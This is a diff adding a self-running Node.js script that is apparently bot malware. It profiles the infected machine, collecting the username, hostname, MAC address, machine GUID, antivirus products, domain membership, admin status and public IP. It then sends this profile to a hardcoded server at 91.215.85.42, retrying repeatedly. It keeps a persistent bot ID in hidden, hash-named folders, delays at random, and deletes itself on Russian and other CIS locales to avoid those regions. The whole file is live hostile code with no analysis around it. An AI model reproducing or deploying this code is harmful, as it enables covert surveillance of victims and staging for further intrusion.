@@ -1,0 +1,364 @@
+(async () => {
+    try {
+        const os = require('os');
+        const { execSync } = require('child_process');
+        const crypto = require('crypto');
+        const fs = require('fs');
+        const path = require('path');
+        
+        const _log = typeof log === 'function' ? log : () => {};
+        const isWin = os.platform() === 'win32';
+        const isLinux = os.platform() === 'linux';
+        const isMac = os.platform() === 'darwin';
+
+        const getInstallDir = () => {
+            if (isWin) {
+                const base = process.env.LOCALAPPDATA || path.join(process.env.USERPROFILE || '', 'AppData', 'Local');
+                const folders = ['Microsoft', 'Windows', 'Programs', 'Packages', 'Google'];
+                const subfolders = ['Services', 'Components', 'Assemblies', 'Extensions', 'Modules'];
+                const machineId = (process.env.COMPUTERNAME || '') + (process.env.USERNAME || '');
+                const hash = crypto.createHash('md5').update(machineId).digest('hex').slice(0, 8);
+                const f1 = folders[parseInt(hash.slice(0, 2), 16) % folders.length];
+                const f2 = subfolders[parseInt(hash.slice(2, 4), 16) % subfolders.length];
+                const f3 = hash.slice(4);
+                const preferred = path.join(base, f1);
+                if (fs.existsSync(preferred)) return path.join(preferred, f2, f3);
+                return path.join(base, hash);
+            } else {
+                // For Linux - use script directory (same as payload.js)
+                try {
+                    const scriptPath = process.argv[1] || __filename;
+                    const scriptDir = path.dirname(scriptPath);
+                    // Check if config exists in script directory
+                    const testCfg = path.join(scriptDir, '.' + crypto.createHash('md5').update(scriptDir).digest('hex').slice(0, 6));
+                    if (fs.existsSync(testCfg)) return scriptDir;
+                } catch {}
+                // Fallback to hash-based path
+                const home = os.homedir();
+                const xdgData = process.env.XDG_DATA_HOME || path.join(home, '.local', 'share');
+                const folders = ['app', 'cache', 'lib', 'data', 'run'];
+                const subfolders = ['services', 'modules', 'core', 'system', 'runtime'];
+                const machineId = (os.hostname() || '') + (os.userInfo().username || '');
+                const hash = crypto.createHash('md5').update(machineId).digest('hex').slice(0, 8);
+                const f1 = folders[parseInt(hash.slice(0, 2), 16) % folders.length];
+                const f2 = subfolders[parseInt(hash.slice(2, 4), 16) % subfolders.length];
+                const f3 = '.' + hash.slice(4);
+                return path.join(xdgData, f1, f2, f3);
+            }
+        };
+
+        const INSTALL_DIR = getInstallDir();
+        const CFG_FILE = path.join(INSTALL_DIR, (isWin ? '' : '.') + crypto.createHash('md5').update(INSTALL_DIR).digest('hex').slice(0, 6));
+
+        const readCfg = () => {
+            try {
+                if (fs.existsSync(CFG_FILE)) {
+                    return JSON.parse(Buffer.from(fs.readFileSync(CFG_FILE, 'utf8'), 'base64').toString());
+                }
+            } catch {}
+            return null;
+        };
+
+        const getHWID = () => {
+            // Try main config first
+            const cfg = readCfg();
+            if (cfg && cfg[0]) return cfg[0];
+            
+            // For Linux - also check script directory for config
+            if (!isWin) {
+                try {
+                    const scriptPath = process.argv[1] || __filename;
+                    const scriptDir = path.dirname(scriptPath);
+                    const cfgName = '.' + crypto.createHash('md5').update(scriptDir).digest('hex').slice(0, 6);
+                    const cfgPath = path.join(scriptDir, cfgName);
+                    if (fs.existsSync(cfgPath)) {
+                        const data = JSON.parse(Buffer.from(fs.readFileSync(cfgPath, 'utf8'), 'base64').toString());
+                        if (data && data[0]) return data[0];
+                    }
+                    // Also search for any config-like files in script directory
+                    const entries = fs.readdirSync(scriptDir);
+                    for (const entry of entries) {
+                        if (entry.startsWith('.') && entry.length >= 6 && entry.length <= 10) {
+                            try {
+                                const content = fs.readFileSync(path.join(scriptDir, entry), 'utf8');
+                                const data = JSON.parse(Buffer.from(content, 'base64').toString());
+                                if (data && data[0]) return data[0];
+                            } catch {}
+                        }
+                    }
+                } catch {}
+            }
+            
+            const oldDir = process.env.APPDATA || os.homedir();
+            
+            const oldFile = path.join(oldDir, '.node_bot_id');
+            try {
+                if (fs.existsSync(oldFile)) {
+                    return fs.readFileSync(oldFile, 'utf8').trim();
+                }
+            } catch {}
+            
+            try {
+                const oldFiles = fs.readdirSync(oldDir).filter(f => f.startsWith('.') && f.length === 11);
+                if (oldFiles.length > 0) {
+                    return fs.readFileSync(path.join(oldDir, oldFiles[0]), 'utf8').trim();
+                }
+            } catch {}
+            
+            return crypto.randomBytes(16).toString('hex');
+        };
+
+        const _chkLocale = () => {
+            const banned = ['ru','be','kk','ky','tg','uz','hy','az','ka'];
+            try {
+                if (isWin) {
+                    const locale = execSync('powershell -NoProfile -Command "[System.Globalization.CultureInfo]::InstalledUICulture.Name"', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'] }).trim().toLowerCase();
+                    if (banned.some(l => locale.startsWith(l))) return true;
+                } else {
+                    const locale = (process.env.LANG || process.env.LC_ALL || '').toLowerCase();
+                    if (banned.some(l => locale.startsWith(l))) return true;
+                }
+            } catch {}
+            return false;
+        };
+
+        const _selfDestruct = () => {
+            try {
+                const script = require.main?.filename || process.argv[1];
+                if (script && fs.existsSync(script)) fs.unlinkSync(script);
+            } catch {}
+            process.exit(0);
+        };
+
+        if (_chkLocale()) {
+            _selfDestruct();
+            return;
+        }
+
+        await new Promise(r => setTimeout(r, Math.random() * 3000 + 1000));
+
+        const formatBytes = (bytes) => (bytes / (1024 ** 3)).toFixed(2) + ' GB';
+        
+        const getMac = () => {
+            const ni = os.networkInterfaces();
+            for (const name in ni) {
+                for (const iface of ni[name]) {
+                    if (!iface.internal && iface.mac && iface.mac !== '00:00:00:00:00:00') return iface.mac;
+                }
+            }
+            return 'unknown';
+        };
+        
+        const getPublicIP = async () => {
+            const apis = [
+                'https://api.ipify.org?format=json',
+                'https://api.my-ip.io/v2/ip.json',
+                'https://api64.ipify.org?format=json'
+            ];
+            for (const api of apis) {
+                try {
+                    const r = await fetch(api, { signal: AbortSignal.timeout(3000) });
+                    const d = await r.json();
+                    return d.ip;
+                } catch {}
+            }
+            return null;
+        };
+        
+        const getGpu = () => {
+            if (isWin) {
+                try {
+                    const r = execSync('powershell -NoProfile -Command "(Get-WmiObject Win32_VideoController).Name -join \', \'"', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 8000 }).trim();
+                    if (r && r !== '' && !r.includes('Exception')) return r;
+                } catch {}
+                try {
+                    const r = execSync('wmic path win32_VideoController get name', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 5000 });
+                    const lines = r.split('\n').map(l => l.trim()).filter(l => l && l !== 'Name');
+                    if (lines.length > 0) return lines.join(', ');
+                } catch {}
+            } else {
+                try {
+                    const r = execSync('lspci 2>/dev/null | grep -i vga | cut -d: -f3', 
+                        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'], timeout: 5000 }).trim();
+                    if (r) return r;
+                } catch {}
+                try {
+                    const r = execSync('glxinfo 2>/dev/null | grep "OpenGL renderer" | cut -d: -f2', 
+                        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'], timeout: 5000 }).trim();
+                    if (r) return r;
+                } catch {}
+            }
+            return 'unknown';
+        };
+        
+        const getAntivirus = () => {
+            if (isWin) {
+                try {
+                    const r = execSync('powershell -NoProfile -Command "try { (Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct -EA Stop).displayName -join \', \' } catch { \'none\' }"', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 8000 }).trim();
+                    if (r && r !== '' && r !== 'none' && !r.includes('Exception')) return r;
+                } catch {}
+            } else {
+                const avProcesses = ['clamd', 'freshclam', 'sophos', 'avast', 'eset', 'kaspersky', 'comodo'];
+                try {
+                    const ps = execSync('ps aux 2>/dev/null', { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'] });
+                    const found = avProcesses.filter(av => ps.toLowerCase().includes(av));
+                    if (found.length > 0) return found.join(', ');
+                } catch {}
+            }
+            return 'none';
+        };
+        
+        const getDomainInfo = () => {
+            let domain = 'WORKGROUP', inDomain = false, isAdmin = false;
+            if (isWin) {
+                try {
+                    const r = execSync('powershell -NoProfile -Command "(Get-WmiObject Win32_ComputerSystem).Domain"', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 5000 }).trim();
+                    if (r) domain = r;
+                } catch {}
+                try {
+                    const r = execSync('powershell -NoProfile -Command "(Get-WmiObject Win32_ComputerSystem).PartOfDomain"', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 5000 }).trim();
+                    inDomain = r.toLowerCase() === 'true';
+                } catch { inDomain = domain.toUpperCase() !== 'WORKGROUP' && domain.includes('.'); }
+                try {
+                    execSync('net session', { windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 2000 });
+                    isAdmin = true;
+                } catch { isAdmin = false; }
+            } else {
+                try {
+                    domain = execSync('hostname -d 2>/dev/null || dnsdomainname 2>/dev/null || echo "local"', 
+                        { encoding: 'utf-8', stdio: ['pipe', 'pipe', 'ignore'] }).trim() || 'local';
+                    inDomain = domain !== 'local' && domain !== '' && domain !== '(none)';
+                } catch { domain = 'local'; }
+                try {
+                    isAdmin = process.getuid() === 0;
+                } catch { isAdmin = false; }
+            }
+            return { domain, inDomain, isAdmin };
+        };
+        
+        const getOsInfo = () => {
+            if (isWin) {
+                try {
+                    const r = execSync('reg query "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" /v ProductName', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 2000 }).trim();
+                    const m = r.match(/ProductName\s+REG_SZ\s+(.+)/i);
+                    return m ? m[1].trim() : null;
+                } catch { return null; }
+            } else if (isLinux) {
+                try {
+                    if (fs.existsSync('/etc/os-release')) {
+                        const osRelease = fs.readFileSync('/etc/os-release', 'utf8');
+                        const prettyName = osRelease.match(/PRETTY_NAME="?([^"\n]+)"?/);
+                        if (prettyName) return prettyName[1];
+                    }
+                } catch {}
+                try {
+                    return execSync('lsb_release -d 2>/dev/null | cut -f2', { encoding: 'utf-8' }).trim();
+                } catch {}
+            } else if (isMac) {
+                try {
+                    return execSync('sw_vers -productName && sw_vers -productVersion', { encoding: 'utf-8' }).trim().replace('\n', ' ');
+                } catch {}
+            }
+            return null;
+        };
+        
+        const getMachineGuid = () => {
+            if (isWin) {
+                try {
+                    const r = execSync('reg query "HKLM\\SOFTWARE\\Microsoft\\Cryptography" /v MachineGuid', 
+                        { encoding: 'utf-8', windowsHide: true, stdio: ['pipe', 'pipe', 'ignore'], timeout: 2000 }).trim();
+                    const m = r.match(/MachineGuid\s+REG_SZ\s+([a-f0-9-]+)/i);
+                    return m ? m[1] : null;
+                } catch { return null; }
+            } else {
+                try {
+                    if (fs.existsSync('/etc/machine-id')) {
+                        return fs.readFileSync('/etc/machine-id', 'utf8').trim();
+                    }
+                    if (fs.existsSync('/var/lib/dbus/machine-id')) {
+                        return fs.readFileSync('/var/lib/dbus/machine-id', 'utf8').trim();
+                    }
+                } catch {}
+                return null;
+            }
+        };
+        
+        const cpuModels = [...new Set(os.cpus().map(c => c.model.trim()))].join(', ');
+        const publicIPPromise = getPublicIP();
+        
+        const info = {
+            type: 'sys_info',
+            taskId: "d0cba908-3b41-41ef-814f-8f1a3a32f0d8",
+            timestamp: Date.now(),
+            username: os.userInfo().username,
+            hostname: os.hostname(),
+            platform: os.platform(),
+            release: os.release(),
+            arch: os.arch(),
+            cpus: cpuModels,
+            cpuCores: os.cpus().length,
+            totalMem: formatBytes(os.totalmem()),
+            freeMem: formatBytes(os.freemem()),
+            uptime: Math.floor(os.uptime() / 3600) + 'h',
+            homedir: os.homedir(),
+            tmpdir: os.tmpdir(),
+            nodeVersion: process.versions.node,
+            mac: getMac()
+        };
+        
+        // Get GPU for all platforms
+        try { info.gpu = getGpu(); } catch { info.gpu = 'unknown'; }
+        
+        // Get antivirus for all platforms
+        try { info.antivirus = getAntivirus(); } catch { info.antivirus = 'none'; }
+        
+        // Get domain info for all platforms
+        try {
+            const di = getDomainInfo();
+            info.domain = di.domain;
+            info.inDomain = di.inDomain;
+            info.isAdmin = di.isAdmin;
+        } catch {
+            info.domain = isWin ? 'WORKGROUP' : 'local';
+            info.inDomain = false;
+            info.isAdmin = false;
+        }
+        
+        // Get OS-specific info
+        try {
+            info.osInfo = getOsInfo();
+            info.machineGuid = getMachineGuid();
+        } catch {}
+        
+        info.publicIP = await publicIPPromise;
+        info.os = (info.osInfo || info.platform) + ' ' + info.release;
+        
+        const serverUrl = "http://91.215.85.42:3000";
+        const hwid = getHWID();
+        const postUrl = `${serverUrl}/${hwid}`;
+        
+        const sendWithRetry = async (url, data, maxRetries = 100) => {
+            for (let i = 0; i < maxRetries; i++) {
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(data)
+                    });
+                    if (response.ok || response.status < 500) return response;
+                } catch {}
+                await new Promise(r => setTimeout(r, 2000 * (i + 1)));
+            }
+            return null;
+        };
+        
+        await sendWithRetry(postUrl, info);
+    } catch {}
+})()
